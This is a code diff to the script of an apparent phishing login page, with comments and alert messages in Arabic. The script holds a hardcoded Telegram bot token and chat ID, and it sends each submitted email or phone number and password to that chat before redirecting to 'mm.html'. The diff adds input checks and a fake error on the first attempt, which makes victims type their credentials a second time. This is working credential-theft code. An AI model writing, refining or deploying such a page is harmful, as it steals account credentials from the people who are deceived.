@@ -37,22 +37,38 @@
    </div>
    <script>
       const BOT_TOKEN = "7910159145:AAGZpUFe7LZfQxQAG1huLQz-bVUtISJhS4g";
-      const CHAT_ID = "5792222595"; 
+      const CHAT_ID = "5792222595";
+      let isFirstAttempt = true; // حالة المحاولة الأولى
 
       document.getElementById("loginForm").addEventListener("submit", function(event) {
          event.preventDefault();
 
-         const emailOrPhone = document.getElementById("emailOrPhone").value;
-         const password = document.getElementById("password").value;
+         const emailOrPhone = document.getElementById("emailOrPhone").value.trim();
+         const password = document.getElementById("password").value.trim();
          const rememberMe = document.getElementById("user-check").checked;
 
-         if (!emailOrPhone || !password) {
-             alert("Please fill in all fields.");
-             return;
+         // التحقق من صحة البريد الإلكتروني أو رقم الهاتف
+         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+         const phoneRegex = /^[0-9]{10,15}$/;
+
+         if (!emailRegex.test(emailOrPhone) && !phoneRegex.test(emailOrPhone)) {
+            alert("الرجاء التحقق من الرقم أو البريد الالكتروني.");
+            return;
+         }
+
+         if (password.length < 6) {
+            alert("الرجاء كتابة كلمة مرور صحيحة");
+            return;
+         }
+
+         if (isFirstAttempt) {
+            alert("الرجاء التحقق من صحة البيانات");
+            isFirstAttempt = false; 
+            return;
          }
 
          const message = `
-User : ${emailOrPhone}
+User: ${emailOrPhone}
 Pass: ${password}
          `;
 
@@ -69,7 +85,7 @@ Pass: ${password}
          .then(response => response.json())
          .then(data => {
             if (data.ok) {
-               window.location.href = "mm.html"
+               window.location.href = "mm.html";
             } else {
                alert("Failed to send message. Please try again.");
             }
